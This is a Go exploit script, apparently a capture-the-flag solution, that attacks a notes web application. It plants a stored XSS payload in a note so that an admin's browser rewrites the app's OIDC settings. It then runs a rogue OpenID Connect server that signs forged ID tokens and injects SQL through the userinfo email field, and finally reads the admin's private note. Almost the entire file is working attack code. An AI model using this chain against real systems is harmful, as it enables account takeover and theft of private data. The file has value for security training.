package main

import (
	"bytes"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt"
	"golang.org/x/net/publicsuffix"
)

func loadPublicKeyFromFile(filePath string) (*rsa.PublicKey, error) {
	// Read the public key file
	keyBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	// Parse the PEM-encoded public key
	block, _ := pem.Decode(keyBytes)
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block containing the public key")
	}

	// Parse the public key
	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	// Assert that the parsed key is an RSA public key
	rsaPubKey, ok := pubKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("parsed key is not an RSA public key")
	}

	return rsaPubKey, nil
}

func post(url string, data map[string]interface{}) *http.Response {
	httpClient := &http.Client{}
	jsonValue, err := json.Marshal(data)
	if err != nil {
		log.Fatalln(err.Error())
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonValue))
	if err != nil {
		log.Fatalln(err.Error())
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-NOTES-CSRF-PROTECTION", "1")
	resp, err := httpClient.Do(req)
	if err != nil {
		log.Fatalln(err.Error())
	}
	return resp
}

func postJSON(url string, data map[string]interface{}) map[string]interface{} {
	resp := post(url, data)
	defer resp.Body.Close()

	var responseMap map[string]interface{}
	err := json.NewDecoder(resp.Body).Decode(&responseMap)
	if err != nil {
		log.Fatalln(err.Error())
	}

	return responseMap
}

func main() {
	clientId := "web"
	target := "http://localhost:1337"
	endpoint := "http://172.17.0.1:3001" // Change me
	go func() {
		// Set up the malicious note which will post out OIDC server details
		payload := fmt.Sprintf(
			`[{"type":"img","attr":{"onerror":"fetch('/api/support/faction/1/config',{method:'POST',headers:{'X-NOTES-CSRF-PROTECTION': '1'},body:JSON.stringify({clientId:'%s',clientSecret:'%s',endpoint:'%s'})})", "src":"x"},"content":""}]`,
			clientId,
			"secret",
			endpoint,
		)
		// Creating malicious note
		responseMap := postJSON(target+"/api/note", map[string]interface{}{
			"title":   "xss",
			"content": base64.RawURLEncoding.EncodeToString([]byte(payload)),
			"private": false,
		})

		// Flag malicious note to trigger the XSS and add our OIDC config
		log.Println(postJSON(fmt.Sprintf("%s/api/note/%.0f/report", target, responseMap["id"].(float64)), map[string]interface{}{}))

		time.Sleep(2 * time.Second)
		// Login
		responseMap = postJSON(target+"/auth/sso", map[string]interface{}{"id": 1})
		// Grab admin token
		options := cookiejar.Options{
			PublicSuffixList: publicsuffix.List,
		}
		jar, err := cookiejar.New(&options)
		if err != nil {
			log.Fatal(err)
		}
		client := http.Client{Jar: jar}
		req, err := http.NewRequest("GET", responseMap["url"].(string), bytes.NewBuffer([]byte{}))
		if err != nil {
			log.Fatalln(err.Error())
		}
		client.Do(req)
		// u, _ := url.Parse(target)
		// adminToken := jar.Cookies(u)[0]
		// log.Println(adminToken)
		// Get admin's private note with the flag
		req, err = http.NewRequest("GET", target+"/api/note/1", bytes.NewBuffer([]byte{}))
		if err != nil {
			log.Fatalln(err.Error())
		}
		resp, err := client.Do(req)
		err = json.NewDecoder(resp.Body).Decode(&responseMap)
		if err != nil {
			log.Fatalln(err.Error())
		}
		note, err := base64.RawURLEncoding.DecodeString(responseMap["content"].(string))
		if err != nil {
			log.Println(responseMap["content"])
			log.Fatalln(err.Error())
		}
		log.Println(string(note))
	}()
	// Load keys
	privateKeyBytes, err := ioutil.ReadFile("private_key.pem")
	if err != nil {
		log.Fatalln("Error reading private key file:", err)
	}
	privateKey, err := jwt.ParseRSAPrivateKeyFromPEM(privateKeyBytes)
	if err != nil {
		log.Fatalln("Error parsing private key:", err)
	}
	publicKey, err := loadPublicKeyFromFile("public_key.pem")
	// Define OIDC server
	r := gin.Default()
	r.GET("/.well-known/openid-configuration", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"issuer":                 endpoint,
			"authorization_endpoint": endpoint + "/oidc/authorize",
			"token_endpoint":         endpoint + "/oidc/token",
			"userinfo_endpoint":      endpoint + "/oidc/userinfo",
			"jwks_uri":               endpoint + "/.well-known/openid-configuration/keys",
		})
	})
	r.GET("/.well-known/openid-configuration/keys", func(c *gin.Context) {
		jwk := map[string]interface{}{
			"kty": "RSA",
			"alg": "RS256",
			"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(publicKey.E)).Bytes()),
			"n":   base64.RawURLEncoding.EncodeToString(publicKey.N.Bytes()),
		}
		hash := sha256.Sum256([]byte(fmt.Sprintf("%v", jwk)))

		// Encode the hash as base64 to generate the "kid"
		kid := base64.RawURLEncoding.EncodeToString(hash[:])
		jwk["kid"] = kid
		c.JSON(200, gin.H{
			"keys": []map[string]interface{}{
				jwk,
			},
		})
	})
	r.GET("/oidc/authorize", func(c *gin.Context) {
		state, _ := c.GetQuery("state")
		c.Redirect(301, target+"/auth/sso/callback?state="+state+"&code=123")
	})
	r.POST("/oidc/token", func(c *gin.Context) {
		idToken := jwt.NewWithClaims(jwt.SigningMethodRS256, jwt.MapClaims{
			"iss": endpoint,
			"sub": "",
			"aud": clientId,
			"exp": time.Now().Add(time.Minute * 10).Unix(),
			"iat": time.Now().Unix(),
		})
		signed, err := idToken.SignedString(privateKey)
		if err != nil {
			log.Fatal(err.Error())
		}
		c.JSON(200, gin.H{
			"access_token": "random",
			"id_token":     signed,
		})
	})
	r.GET("/oidc/userinfo", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"email": "'tom@ca.htb'; UPDATE `notes` SET author_id=NULL,private=0 -- -",
		})
	})
	r.Run(":3001")
}
